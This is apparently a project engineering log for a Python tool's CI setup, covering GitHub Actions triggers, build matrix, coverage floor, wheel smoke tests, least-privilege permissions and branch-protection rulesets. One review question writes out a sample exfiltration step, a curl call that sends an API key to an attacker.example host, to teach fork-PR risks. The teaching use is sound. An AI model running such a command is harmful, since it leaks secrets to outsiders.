# Phase 8 — Quality gates and CI

## What changed (plain words)

Every pull request and every push to `main` now runs five checks on GitHub's machines: lint and format, the test suite with a coverage floor on Linux (Python 3.12 and 3.13) and Windows (3.13), and a smoke test of the built wheel installed outside the repo. `main` is protected: a change lands only through a pull request with all five checks green, and nobody — including the owner — can push to it directly or skip the checks. Dependabot keeps the pinned GitHub Actions up to date.

## Why

Most real bugs this project caught were found by checks done by hand: a fresh clone found `retry.py` and `ratelimit.py` missing from commits, a per-commit run found fixtures at the repo root, looking inside the wheel found that setuptools dropped `tlds.txt`, and running ruff found a dead import that was keeping vacuous test patches alive. Twice, commits went straight to `main` the same day a rule said they shouldn't. The local pre-commit hook helps but can be skipped and tests the working folder, not the commit. CI runs the same checks from a clean machine every time, and the ruleset makes passing them the only way in.

## Key decisions and trade-offs

- **Triggers: `pull_request` + `push` to `main`.** PRs test the merge result before merging; runs on `main` catch two PRs that each passed alone but break together. Rejected: `push` on every branch (each PR push would run twice).
- **A small matrix.** Linux 3.12 (our declared minimum) and 3.13; Windows 3.13 only (analysts' machines, the `win32` settings path, console colours, UTF-16 files). The Windows job passed on its first run — the first time the suite ran on Windows outside the owner's machine.
- **Coverage floor at 90%, not 100%.** Coverage measures lines run inside the pytest process: `__main__.py` shows 0% although a subprocess test proves it works. A floor catches a whole untested module; a 100% target invites tests written for the number.
- **The wheel is tested, not just the source.** The `package` job builds the wheel, installs it into a fresh venv, and runs it from outside the checkout. Removing `tlds.txt` from the installed package makes it fail — the Phase 7 setuptools trap, now caught automatically.
- **CI as attack surface.** No secrets at all (a dummy key, never sent). `permissions: contents: read`; `persist-credentials: false`. Actions pinned to full commit SHAs (a moved tag cannot change what runs), kept current by Dependabot. Never `pull_request_target`, which runs fork code with the base repo's secrets.
- **Independent jobs, `fail-fast: false`, 10-minute timeouts.** A red check names the failing gate; one failing combination doesn't hide the others; a hung test can't hold a runner for the default 6 hours.
- **Branch protection as a ruleset.** PR required with 0 approvals (you cannot approve your own PR), all five checks required, branch must be up to date, no force pushes, no deletion, empty bypass list. Cost: every change needs a branch and about a minute of CI; a broken CI blocks merges — which is the point.

## Evidence

- Deliberate red run: `fe28875` added `assert 1 + 1 == 3`; the three `test` jobs failed with `FAILED tests/test_refang.py::test_ci_goes_red_on_a_failing_test`, while `lint` and `package` stayed green. `91b96c5` reverted it with `git revert`, keeping both commits in history as the record.
- Direct push to `main` after the ruleset was enabled was rejected:

  ```
  ! [remote rejected] main -> main (push declined due to repository rule violations)
  ```

## Python/engineering concepts used

- **Continuous integration** → run the same checks on every change, on a clean machine, automatically.
- **Quality gate** → a check that must pass before a change can land → the five required checks.
- **Build matrix** → one job definition, several OS/Python combinations → `test` job.
- **Merge commit testing** → `pull_request` runs test your branch merged into `main`, not the branch alone.
- **Least privilege** → `permissions: contents: read`, no secrets, no stored token.
- **Supply-chain pinning** → actions by commit SHA; tags can be moved, SHAs cannot.
- **Coverage, and its limits** → lines executed in-process; a floor, not a goal (Goodhart's law).
- **`set -euo pipefail`** → a shell script stops at the first failing command, including one inside a pipe.
- **Server-side enforcement** → a ruleset is checked by GitHub and cannot be skipped like a local hook (`--no-verify`).
- **`git revert`** → undo with a new commit, keeping the history honest; never rewrite a shared branch.

## Read in this order

1. `.github/workflows/ci.yml` — top to bottom: triggers, permissions, concurrency, then the three jobs.
2. The `package` job's smoke step — what it runs and why from `$RUNNER_TEMP`.
3. `.github/dependabot.yml` — why pinning needs it.
4. Repo Settings → Rules → Rulesets → `protect main` — each rule and what it blocks.
5. Commits `fe28875` and `91b96c5`, and the PR's check history around them.

## Check yourself

1. Why does the `package` job install the wheel with `pip install dist/*.whl` and not `pip install -e .`? What would it stop catching?
2. `__main__.py` has 0% coverage and is still tested. Explain both halves of that sentence.
3. A contributor's fork PR changes the workflow to `run: curl https://attacker.example/?k=$VIRUSTOTAL_API`. What does it get, and what would change with `pull_request_target`?
4. Dependabot opens a PR moving `actions/checkout` to a new SHA. What do you check before merging it?
5. Two PRs each pass CI and are merged five minutes apart; `main` breaks. Which setting would have prevented it, and how?
